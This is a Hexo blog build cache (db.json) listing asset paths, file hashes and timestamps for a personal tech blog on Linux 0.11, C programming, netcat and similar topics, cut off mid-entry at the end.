{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"source/CNAME","path":"CNAME","modified":0,"renderable":0},{"_id":"source/blog.ico","path":"blog.ico","modified":0,"renderable":0},{"_id":"source/images/2.png","path":"images/2.png","modified":0,"renderable":0},{"_id":"source/images/1.png","path":"images/1.png","modified":0,"renderable":0},{"_id":"source/images/4.png","path":"images/4.png","modified":0,"renderable":0},{"_id":"source/images/3.png","path":"images/3.png","modified":0,"renderable":0},{"_id":"source/images/5.png","path":"images/5.png","modified":0,"renderable":0},{"_id":"source/images/6.png","path":"images/6.png","modified":0,"renderable":0},{"_id":"source/images/7.png","path":"images/7.png","modified":0,"renderable":0},{"_id":"source/images/8.png","path":"images/8.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_EGA_VGA.png","path":"images/Linux_0.11_EGA_VGA.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_Main_Memory.png","path":"images/Linux_0.11_Main_Memory.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_ROM_BIOS.png","path":"images/Linux_0.11_ROM_BIOS.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_hard_disk2.png","path":"images/Linux_0.11_hard_disk2.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_interrupt_8259A.png","path":"images/Linux_0.11_interrupt_8259A.png","modified":0,"renderable":0},{"_id":"source/images/OpenWrt.png","path":"images/OpenWrt.png","modified":0,"renderable":0},{"_id":"source/images/Linux_kernel_0.11.png","path":"images/Linux_kernel_0.11.png","modified":0,"renderable":0},{"_id":"source/images/compile.png","path":"images/compile.png","modified":0,"renderable":0},{"_id":"source/images/OpenWrt_ssh.png","path":"images/OpenWrt_ssh.png","modified":0,"renderable":0},{"_id":"source/images/Openwrt_sha256_compare.png","path":"images/Openwrt_sha256_compare.png","modified":0,"renderable":0},{"_id":"source/images/define_E.png","path":"images/define_E.png","modified":0,"renderable":0},{"_id":"source/images/define_o.png","path":"images/define_o.png","modified":0,"renderable":0},{"_id":"source/images/define_S_main.png","path":"images/define_S_main.png","modified":0,"renderable":0},{"_id":"source/images/define_S.png","path":"images/define_S.png","modified":0,"renderable":0},{"_id":"source/images/define_c.png","path":"images/define_c.png","modified":0,"renderable":0},{"_id":"source/images/gcc-st-2.png","path":"images/gcc-st-2.png","modified":0,"renderable":0},{"_id":"source/images/gcc-st-3.png","path":"images/gcc-st-3.png","modified":0,"renderable":0},{"_id":"source/images/gcc-st-4.png","path":"images/gcc-st-4.png","modified":0,"renderable":0},{"_id":"source/images/gcc-st-5.png","path":"images/gcc-st-5.png","modified":0,"renderable":0},{"_id":"source/images/gcc_program.png","path":"images/gcc_program.png","modified":0,"renderable":0},{"_id":"source/images/gcc-st-7.png","path":"images/gcc-st-7.png","modified":0,"renderable":0},{"_id":"source/images/git.png","path":"images/git.png","modified":0,"renderable":0},{"_id":"source/images/printf.png","path":"images/printf.png","modified":0,"renderable":0},{"_id":"source/images/zhifubao.png","path":"images/zhifubao.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_CGA_Color.png","path":"images/Linux_0.11_CGA_Color.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_MDA_Color.png","path":"images/Linux_0.11_MDA_Color.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_arch_IBM_Intel.png","path":"images/Linux_0.11_arch_IBM_Intel.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_modern_PC.png","path":"images/Linux_0.11_modern_PC.png","modified":0,"renderable":0},{"_id":"source/images/gcc-st-6.png","path":"images/gcc-st-6.png","modified":0,"renderable":0},{"_id":"source/images/gcc-st-1.png","path":"images/gcc-st-1.png","modified":0,"renderable":0},{"_id":"source/images/va_arg.png","path":"images/va_arg.png","modified":0,"renderable":0},{"_id":"source/images/vsprintf.png","path":"images/vsprintf.png","modified":0,"renderable":0},{"_id":"source/images/targets.png","path":"images/targets.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_hard_disk1.png","path":"images/Linux_0.11_hard_disk1.png","modified":0,"renderable":0},{"_id":"source/images/kernel_release_1.png","path":"images/kernel_release_1.png","modified":0,"renderable":0},{"_id":"themes/next/source/css/main.styl","path":"css/main.styl","modified":0,"renderable":1},{"_id":"themes/next/source/images/avatar.gif","path":"images/avatar.gif","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by-nc-nd.svg","path":"images/cc-by-nc-nd.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by-nc-sa.svg","path":"images/cc-by-nc-sa.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by-nc.svg","path":"images/cc-by-nc.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by-nd.svg","path":"images/cc-by-nd.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by-sa.svg","path":"images/cc-by-sa.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-by.svg","path":"images/cc-by.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/cc-zero.svg","path":"images/cc-zero.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/loading.gif","path":"images/loading.gif","modified":0,"renderable":1},{"_id":"themes/next/source/images/placeholder.gif","path":"images/placeholder.gif","modified":0,"renderable":1},{"_id":"themes/next/source/images/quote-l.svg","path":"images/quote-l.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/quote-r.svg","path":"images/quote-r.svg","modified":0,"renderable":1},{"_id":"themes/next/source/images/searchicon.png","path":"images/searchicon.png","modified":0,"renderable":1},{"_id":"source/images/avatar.png","path":"images/avatar.png","modified":0,"renderable":0},{"_id":"source/images/kernel_release_2.png","path":"images/kernel_release_2.png","modified":0,"renderable":0},{"_id":"source/images/APMPlanner.png","path":"images/APMPlanner.png","modified":0,"renderable":0},{"_id":"themes/next/source/lib/font-awesome/HELP-US-OUT.txt","path":"lib/font-awesome/HELP-US-OUT.txt","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/bower.json","path":"lib/font-awesome/bower.json","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fastclick/LICENSE","path":"lib/fastclick/LICENSE","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fastclick/README.md","path":"lib/fastclick/README.md","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fastclick/bower.json","path":"lib/fastclick/bower.json","modified":0,"renderable":1},{"_id":"themes/next/source/lib/jquery_lazyload/CONTRIBUTING.md","path":"lib/jquery_lazyload/CONTRIBUTING.md","modified":0,"renderable":1},{"_id":"themes/next/source/lib/jquery_lazyload/bower.json","path":"lib/jquery_lazyload/bower.json","modified":0,"renderable":1},{"_id":"themes/next/source/lib/jquery_lazyload/README.md","path":"lib/jquery_lazyload/README.md","modified":0,"renderable":1},{"_id":"themes/next/source/lib/jquery_lazyload/jquery.lazyload.js","path":"lib/jquery_lazyload/jquery.lazyload.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/jquery_lazyload/jquery.scrollstop.js","path":"lib/jquery_lazyload/jquery.scrollstop.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/velocity/bower.json","path":"lib/velocity/bower.json","modified":0,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.min.js","path":"lib/velocity/velocity.min.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.ui.js","path":"lib/velocity/velocity.ui.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.ui.min.js","path":"lib/velocity/velocity.ui.min.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/affix.js","path":"js/src/affix.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/bootstrap.js","path":"js/src/bootstrap.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/hook-duoshuo.js","path":"js/src/hook-duoshuo.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/motion.js","path":"js/src/motion.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/post-details.js","path":"js/src/post-details.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/scrollspy.js","path":"js/src/scrollspy.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/utils.js","path":"js/src/utils.js","modified":0,"renderable":1},{"_id":"source/images/nc_reverse_shell.png","path":"images/nc_reverse_shell.png","modified":0,"renderable":0},{"_id":"source/images/nc_file_send.png","path":"images/nc_file_send.png","modified":0,"renderable":0},{"_id":"themes/next/source/lib/jquery/index.js","path":"lib/jquery/index.js","modified":0,"renderable":1},{"_id":"source/images/nc_bind_shell.png","path":"images/nc_bind_shell.png","modified":0,"renderable":0},{"_id":"source/images/nc_liaotian.png","path":"images/nc_liaotian.png","modified":0,"renderable":0},{"_id":"themes/next/source/lib/fancybox/source/blank.gif","path":"lib/fancybox/source/blank.gif","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/fancybox_loading.gif","path":"lib/fancybox/source/fancybox_loading.gif","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/fancybox_loading@2x.gif","path":"lib/fancybox/source/fancybox_loading@2x.gif","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/fancybox_overlay.png","path":"lib/fancybox/source/fancybox_overlay.png","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/fancybox_sprite.png","path":"lib/fancybox/source/fancybox_sprite.png","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/fancybox_sprite@2x.png","path":"lib/fancybox/source/fancybox_sprite@2x.png","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.css","path":"lib/fancybox/source/jquery.fancybox.css","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.js","path":"lib/fancybox/source/jquery.fancybox.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.pack.js","path":"lib/fancybox/source/jquery.fancybox.pack.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css","path":"lib/font-awesome/css/font-awesome.css","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css.map","path":"lib/font-awesome/css/font-awesome.css.map","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.min.css","path":"lib/font-awesome/css/font-awesome.min.css","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fastclick/lib/fastclick.js","path":"lib/fastclick/lib/fastclick.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fastclick/lib/fastclick.min.js","path":"lib/fastclick/lib/fastclick.min.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.min.js","path":"lib/ua-parser-js/dist/ua-parser.min.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.pack.js","path":"lib/ua-parser-js/dist/ua-parser.pack.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/schemes/pisces.js","path":"js/src/schemes/pisces.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/FontAwesome.otf","path":"lib/font-awesome/fonts/FontAwesome.otf","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.eot","path":"lib/font-awesome/fonts/fontawesome-webfont.eot","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff","path":"lib/font-awesome/fonts/fontawesome-webfont.woff","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff2","path":"lib/font-awesome/fonts/fontawesome-webfont.woff2","modified":0,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.js","path":"lib/velocity/velocity.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/fancybox_buttons.png","path":"lib/fancybox/source/helpers/fancybox_buttons.png","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-buttons.css","path":"lib/fancybox/source/helpers/jquery.fancybox-buttons.css","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-media.js","path":"lib/fancybox/source/helpers/jquery.fancybox-media.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-thumbs.css","path":"lib/fancybox/source/helpers/jquery.fancybox-thumbs.css","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-buttons.js","path":"lib/fancybox/source/helpers/jquery.fancybox-buttons.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-thumbs.js","path":"lib/fancybox/source/helpers/jquery.fancybox-thumbs.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.ttf","path":"lib/font-awesome/fonts/fontawesome-webfont.ttf","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.svg","path":"lib/font-awesome/fonts/fontawesome-webfont.svg","modified":0,"renderable":1},{"_id":"source/images/pixhawk.jpg","path":"images/pixhawk.jpg","modified":0,"renderable":0},{"_id":"themes/next/source/images/algolia_logo.svg","path":"images/algolia_logo.svg","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/algolia-search.js","path":"js/src/algolia-search.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/algolia-instant-search/instantsearch.min.css","path":"lib/algolia-instant-search/instantsearch.min.css","modified":0,"renderable":1},{"_id":"themes/next/source/lib/algolia-instant-search/instantsearch.min.js","path":"lib/algolia-instant-search/instantsearch.min.js","modified":0,"renderable":1},{"_id":"source/images/Linux_0.11_chapter3_Intel_AT&T_diff.png","path":"images/Linux_0.11_chapter3_Intel_AT&T_diff.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_a.out_linkers.png","path":"images/Linux_0.11_chapter3_a.out_linkers.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_a.out_map.png","path":"images/Linux_0.11_chapter3_a.out_map.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_a.out_map_header1.png","path":"images/Linux_0.11_chapter3_a.out_map_header1.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_a.out_map_header2.png","path":"images/Linux_0.11_chapter3_a.out_map_header2.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_a.out_map_to_memory.png","path":"images/Linux_0.11_chapter3_a.out_map_to_memory.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_a.out_symbol1.png","path":"images/Linux_0.11_chapter3_a.out_symbol1.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_a.out_symbol2.png","path":"images/Linux_0.11_chapter3_a.out_symbol2.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_as86.png","path":"images/Linux_0.11_chapter3_as86.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_as86_boot.png.png","path":"images/Linux_0.11_chapter3_as86_boot.png.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_as86_compile.png","path":"images/Linux_0.11_chapter3_as86_compile.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_ld86.png","path":"images/Linux_0.11_chapter3_ld86.png","modified":0,"renderable":0},{"_id":"source/images/Linux_0.11_chapter3_linker_section.png","path":"images/Linux_0.11_chapter3_linker_section.png","modified":0,"renderable":0}],"Cache":[{"_id":"themes/next/.bowerrc","hash":"334da94ca6f024d60d012cc26ea655681e724ad8","modified":1479102071295},{"_id":"source/404.html","hash":"4f1cb855b89a37189583c5d1291ffc5f0814f1e6","modified":1479092170993},{"_id":"themes/next/.editorconfig","hash":"211d2c92bfdddb3e81ea946f4ca7a539f150f4da","modified":1479102071295},{"_id":"source/CNAME","hash":"cc9605b8d30f19e49fa8ab7f2f41a6c2a42e57c1","modified":1479092171008},{"_id":"themes/next/.gitignore","hash":"de5b9b9e5b313b4a86e805b02f334d35c87bfe56","modified":1479102071295},{"_id":"themes/next/.hound.yml","hash":"289dcf5bfe92dbd680d54d6e0668f41c9c9c0c78","modified":1479102071295},{"_id":"themes/next/.javascript_ignore","hash":"74b54cf920cbbf4038a68e54b7138af8b8f45588","modified":1479102071310},{"_id":"themes/next/.jshintrc","hash":"b7d23f2ce8d99fa073f22f9960605f318acd7710","modified":1479102071310},{"_id":"themes/next/README.en.md","hash":"fa31bbc6dd8778b8dee469740c92b3b5b59702af","modified":1479102071310},{"_id":"themes/next/README.md","hash":"06aaf1241e9e1619956c86d8b1397a643840a9d1","modified":1479102071310},{"_id":"source/blog.ico","hash":"99361b773cbfd3a72636aeccd9720633b38736f3","modified":1479092171165},{"_id":"themes/next/_config.yml","hash":"c2f07feea397f05beb3269e7b9804a21a208c184","modified":1479102237166},{"_id":"themes/next/bower.json","hash":"bd70cf5988bbfc8cbcf13adae659151a55466524","modified":1479102071326},{"_id":"themes/next/gulpfile.coffee","hash":"e549561461642051d195550ec49d793e44ee22a0","modified":1479102071326},{"_id":"themes/next/package.json","hash":"48e2352f8e41f2b6bbf55254d10f3192ee206d5a","modified":1479102072013},{"_id":"source/_data/next.yml","hash":"c2f07feea397f05beb3269e7b9804a21a208c184","modified":1479102171302},{"_id":"source/_posts/Linux内核0-11完全注释-第一章.md","hash":"3d8d978b51e9bda0adbd9ce0a4a4fab805bca557","modified":1479092171024},{"_id":"source/_posts/Linux内核0-11完全注释-第二章.md","hash":"9daa2e8a17bd647b2a65e015f0651b22735b9a86","modified":1479092171024},{"_id":"source/_posts/hello-world.md","hash":"a381b95c355d0ec07bc93f957292f02295e88790","modified":1479105105262},{"_id":"source/_posts/job-summary.md","hash":"d5769cf27f5ddfe3e25bc6cb46fc7a75b8fd801e","modified":1479092171055},{"_id":"source/_posts/memory-align.md","hash":"d93bf2941f70b4c99af3f5d36c86167bc1e72ef2","modified":1479092171055},{"_id":"source/_posts/C语言宏定义小试.md","hash":"259d5656bef920b162cc1b6181224d7ec548d685","modified":1479092171008},{"_id":"source/_posts/netcat简述.md","hash":"f7dc5a66f6b9f08fbb7fa6f48ed7becf3e67286b","modified":1479092171071},{"_id":"source/_posts/一起来撸printf吧.md","hash":"219df37794ff44f1a39f599f41b3653bef997afe","modified":1479092171102},{"_id":"source/_posts/vim-and-emacs.md","hash":"d50aef7064d94ba86a2dd7fed6942fa3480923ec","modified":1479092171086},{"_id":"source/_posts/raspberry-pi-xrdp-error.md","hash":"bc2aa5f62136f69dccad0c77da7a08f3b67e9920","modified":1479092171086},{"_id":"source/_posts/没这么好的馅饼.md","hash":"4f18d290a4b198e64666fa3be8a4f26f0c999d6d","modified":1479092171133},{"_id":"source/_posts/网络安全基本要素及对策.md","hash":"226dbbd4d41590d07f5bb4d87ca8f6b4c1d011bc","modified":1479092171149},{"_id":"source/_posts/无人机学习概况.md","hash":"3949ba4067e2cbfa6ef4a8ef97ee0ccd77f59c20","modified":1479092171118},{"_id":"source/about/index.md","hash":"9b62b2eff406cfe038f0bedfec3709631d96fbca","modified":1479378355862},{"_id":"source/images/2.png","hash":"208416193f290024ffc640fdc333e7b3587eec4d","modified":1479092171180},{"_id":"source/images/1.png","hash":"e868fe80a2e047730e1df6aaabcd606507c3a17e","modified":1479092171180},{"_id":"source/images/4.png","hash":"554d14a653b8f4f11df76aa3c406b68f35f2e0ab","modified":1479092171196},{"_id":"source/images/3.png","hash":"a0dddf07f5a16749a3b578adf04110e23d44085f","modified":1479092171180},{"_id":"source/images/5.png","hash":"6717a5c18766d4528ae0eab58af722768c54026e","modified":1479092171196},{"_id":"source/_posts/常用VPN服务器配置.md","hash":"2ce9e97198c63b049ccf2096360f6a929a864842","modified":1479092171118},{"_id":"source/images/6.png","hash":"74f9ea480bec1b35a8b9cbf55c534d05673ee273","modified":1479092171196},{"_id":"source/images/7.png","hash":"35f2cf9b2c7cb0d9f3eb8e13152778ddbfb3bada","modified":1479092171196},{"_id":"source/images/8.png","hash":"99ed5e9822c52c9fad85270f31c94aa7e627d6fd","modified":1479092171211},{"_id":"source/categories/index.md","hash":"5740d5c107967160a91d59e5c480fc70603cf69f","modified":1479092171180},{"_id":"source/images/Linux_0.11_EGA_VGA.png","hash":"66e1b80bf91a7373d61712b40abfa9f64ed4b1aa","modified":1479092171227},{"_id":"source/images/Linux_0.11_Main_Memory.png","hash":"da357fd9d6a4e9c91e135c140fd4772f18e04df4","modified":1479092171227},{"_id":"source/images/Linux_0.11_ROM_BIOS.png","hash":"c4d38411c7323f78fd4e0bf2716ba511491e43f3","modified":1479092171243},{"_id":"source/images/Linux_0.11_hard_disk2.png","hash":"5cb7b53ded1af21351fbf8eba6ee6cfbeb25cde7","modified":1479092171243},{"_id":"source/images/Linux_0.11_interrupt_8259A.png","hash":"138cbd8d1f35704de1957a6c1f12ecfdedea6c14","modified":1479092171258},{"_id":"source/images/OpenWrt.png","hash":"56347e81efb20b419a448af931615c9098cb1a06","modified":1479092171274},{"_id":"source/images/Linux_kernel_0.11.png","hash":"57b05e8d7d11c1bdd7220cf90ed627382a4ea917","modified":1479092171274},{"_id":"source/images/compile.png","hash":"62bd2a1b7bc93d6c0c51fa60db1100d99f373e37","modified":1479092171290},{"_id":"source/images/OpenWrt_ssh.png","hash":"57c374da62e0a03d2ae84a932e71018fcf8c25ef","modified":1479092171274},{"_id":"source/images/Openwrt_sha256_compare.png","hash":"9a98a16f2c822ba226c3906083d774b421673080","modified":1479092171274},{"_id":"source/images/define_E.png","hash":"7bda0bf85418aea9f9041985602d3e8e9d0d26c6","modified":1479092171290},{"_id":"source/images/define_o.png","hash":"f508e59214fe5f37dccc9e8b3faaf34d04900d7d","modified":1479092171305},{"_id":"source/images/define_S_main.png","hash":"42910e60205df5aa9717cd03a027a400e9c1acfc","modified":1479092171290},{"_id":"source/images/define_S.png","hash":"e6bdb0ee46f9deb3717e89d4e605f559a145251f","modified":1479092171290},{"_id":"source/images/define_c.png","hash":"5d86d7a43d93d0cc70870390dbb4c17737c41efc","modified":1479092171305},{"_id":"source/images/gcc-st-2.png","hash":"d0bc66c65f61436c8e6940bf44f75d746f263368","modified":1479092171305},{"_id":"source/images/gcc-st-3.png","hash":"b793bfe793bd2dbdcf5888d5039f71f2989c2b5d","modified":1479092171305},{"_id":"source/images/gcc-st-4.png","hash":"f582e59a55b9edc216db5b1d25cabe24043a909e","modified":1479092171321},{"_id":"source/images/gcc-st-5.png","hash":"f1dd6c4b4019ddbac67498478f17d19dd4c064d9","modified":1479092171321},{"_id":"source/images/gcc_program.png","hash":"3c61f62f52345e872f237cb8948e852ceef477b7","modified":1479092171336},{"_id":"source/images/gcc-st-7.png","hash":"a1c848c938bc283d980bb27e65eb0ae079639000","modified":1479092171336},{"_id":"source/images/git.png","hash":"372ab0230d46a64ef3e2235201cb38030fa001d3","modified":1479092171336},{"_id":"source/images/printf.png","hash":"c9e186a6e0d189c10038bd564a96eb9b42863730","modified":1479092171443},{"_id":"source/images/zhifubao.png","hash":"40a5400e0cbd9f8bfbfd83be4cc77e4dcdf32652","modified":1479092171459},{"_id":"themes/next/.github/CONTRIBUTING.md","hash":"4312fb37fa2b8663006be3c4fe01125ec01171c1","modified":1479102071295},{"_id":"themes/next/.git/config","hash":"8e94cc015a498d35202e9fd57e44b3c51e1e5634","modified":1479102071263},{"_id":"themes/next/.git/HEAD","hash":"acbaef275e46a7f14c1ef456fff2c8bbe8c84724","modified":1479102071232},{"_id":"themes/next/.github/ISSUE_TEMPLATE.md","hash":"2692e36cc35b1594530981e7727771f601720a43","modified":1479102071295},{"_id":"themes/next/.git/description","hash":"9635f1b7e12c045212819dd934d809ef07efa2f4","modified":1479101581438},{"_id":"source/schedule/index.md","hash":"f558bae0e2901a38065d0a6dcbfea997e49886a0","modified":1479378879315},{"_id":"source/tags/index.md","hash":"9a3e44a42e2b3fd176c72f3f34b1eefbd852ad58","modified":1479092171474},{"_id":"themes/next/.git/index","hash":"5d0bd4f7af9ca383f1ff5b44d2ebd6d990bbde51","modified":1479102182928},{"_id":"themes/next/.git/packed-refs","hash":"9e33b2fbf76f5f8b5e177638ca4078c30040169e","modified":1479102071201},{"_id":"themes/next/languages/de.yml","hash":"4c3ffeb0d214c807a226dd98214958cb5483df1c","modified":1479102071342},{"_id":"themes/next/languages/en.yml","hash":"d02acdce503c86fbb01920ad22d31ec56fc285f1","modified":1479102071342},{"_id":"themes/next/languages/default.yml","hash":"fe00529a94bb2550194a31d178f5810b45014ab6","modified":1479102071342},{"_id":"themes/next/languages/fr-FR.yml","hash":"d8a40fe025fad6f42df0cf16d4be2d513769b062","modified":1479102071357},{"_id":"themes/next/languages/id.yml","hash":"19537c8bae42c4c2e7d06a64537e8dfd503b7e19","modified":1479102071357},{"_id":"themes/next/languages/ja.yml","hash":"e594aa42a33c489e4a65065659a01bb76c3c0cb5","modified":1479102071373},{"_id":"themes/next/languages/ko.yml","hash":"feed5fdb677f87fbb9ba2b6e4413e7011180708e","modified":1479102071373},{"_id":"themes/next/languages/pt-BR.yml","hash":"81498b783372f11b2149bd2b1731e78432760a0e","modified":1479102071388},{"_id":"themes/next/languages/pt.yml","hash":"4c64594f477905d5d2d9ca2422f03175b7b0c617","modified":1479102071388},{"_id":"themes/next/languages/ru.yml","hash":"402e676252ab1fc4522257a578738cb9536eb077","modified":1479102071388},{"_id":"themes/next/languages/zh-Hans.yml","hash":"c74cf512f300127bda30dcec1177e71cbaf8c9fb","modified":1479102071388},{"_id":"themes/next/languages/zh-hk.yml","hash":"88e603eb0f3fd25c35bb37bd30372fd77bba7c46","modified":1479102071404},{"_id":"themes/next/languages/zh-tw.yml","hash":"04479b419c72b71fd34046f3fc33ebda4fe8de84","modified":1479102071404},{"_id":"themes/next/layout/_layout.swig","hash":"b4ef30f7da073bf2a9052186f76e0e080de1c794","modified":1479102071420},{"_id":"themes/next/layout/archive.swig","hash":"b867a08f6b43de8b5d700c84b943df55917407ae","modified":1479102071982},{"_id":"themes/next/layout/category.swig","hash":"58cf08388901f7549b1fca95548b2c79173aa840","modified":1479102071982},{"_id":"themes/next/layout/index.swig","hash":"e5b52e04296203262a400e8e36ae12426d31fd5b","modified":1479102071982},{"_id":"themes/next/layout/page.swig","hash":"2a13804aa186f6062738d136e430870c53789bf4","modified":1479102071998},{"_id":"themes/next/layout/post.swig","hash":"b8334c479840b7724638eec71971cbd8512ae58d","modified":1479102071998},{"_id":"themes/next/layout/schedule.swig","hash":"595013860078799d455af4965b3a7c5c4fd3923c","modified":1479102071998},{"_id":"themes/next/layout/tag.swig","hash":"6f764ea3ab11eeb7c530df45528d449b14f5dc62","modified":1479102071998},{"_id":"themes/next/scripts/merge-configs.js","hash":"f8cde6953939802f92da5b7a2458c6c539e9be69","modified":1479102072013},{"_id":"themes/next/test/.jshintrc","hash":"c9fca43ae0d99718e45a6f5ce736a18ba5fc8fb6","modified":1479102074357},{"_id":"themes/next/test/helpers.js","hash":"f25e7f3265eb5a6e1ccbb5e5012fa9bebf134105","modified":1479102074357},{"_id":"themes/next/test/intern.js","hash":"db90b1063356727d72be0d77054fdc32fa882a66","modified":1479102074373},{"_id":"source/images/Linux_0.11_CGA_Color.png","hash":"675fa85ac0d0d04df9b4d0cc5c5695a34ad21895","modified":1479092171227},{"_id":"source/images/Linux_0.11_MDA_Color.png","hash":"e59662ac0f484fb7279764a1e0621d716a6e4aee","modified":1479092171227},{"_id":"source/images/Linux_0.11_arch_IBM_Intel.png","hash":"b6ed16a71ae2ef9ed93be860e454341e54f494c2","modified":1479092171243},{"_id":"source/images/Linux_0.11_modern_PC.png","hash":"2410a88467edd51ce862c3d267488ef39d4d7bf4","modified":1479092171258},{"_id":"source/images/gcc-st-6.png","hash":"1788a132179b6474357283f99e987e567987a259","modified":1479092171321},{"_id":"source/images/gcc-st-1.png","hash":"aa833055c6abaf80df3a84d41950c87a09dc5341","modified":1479092171305},{"_id":"source/images/va_arg.png","hash":"dc647f93eb227b74643edbe9a6f837075fa36211","modified":1479092171459},{"_id":"source/images/vsprintf.png","hash":"5d35288ad5cc6deb811e2e4eeb92333226fb34ba","modified":1479092171459},{"_id":"source/images/targets.png","hash":"4da91c8116a918f950ce547efe78b1b35d525613","modified":1479092171443},{"_id":"themes/next/source/fonts/.gitkeep","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1479102072779},{"_id":"source/images/Linux_0.11_hard_disk1.png","hash":"7e3db6cf53ed27702478f9d1b8e5fdf2c9ec69a2","modified":1479092171243},{"_id":"source/images/kernel_release_1.png","hash":"e633dbcede442c2a4bdd33e991bd09b2495d3521","modified":1479092171352},{"_id":"themes/next/.git/hooks/applypatch-msg.sample","hash":"4de88eb95a5e93fd27e78b5fb3b5231a8d8917dd","modified":1479101581438},{"_id":"themes/next/.git/hooks/commit-msg.sample","hash":"ee1ed5aad98a435f2020b6de35c173b75d9affac","modified":1479101581453},{"_id":"themes/next/.git/hooks/pre-applypatch.sample","hash":"f208287c1a92525de9f5462e905a9d31de1e2d75","modified":1479101581469},{"_id":"themes/next/.git/hooks/pre-commit.sample","hash":"36aed8976dcc08b5076844f0ec645b18bc37758f","modified":1479101581469},{"_id":"themes/next/.git/hooks/post-update.sample","hash":"b614c2f63da7dca9f1db2e7ade61ef30448fc96c","modified":1479101581453},{"_id":"themes/next/.git/hooks/pre-push.sample","hash":"5c8518bfd1d1d3d2c1a7194994c0a16d8a313a41","modified":1479101581485},{"_id":"themes/next/.git/hooks/pre-receive.sample","hash":"705a17d259e7896f0082fe2e9f2c0c3b127be5ac","modified":1479101581500},{"_id":"themes/next/.git/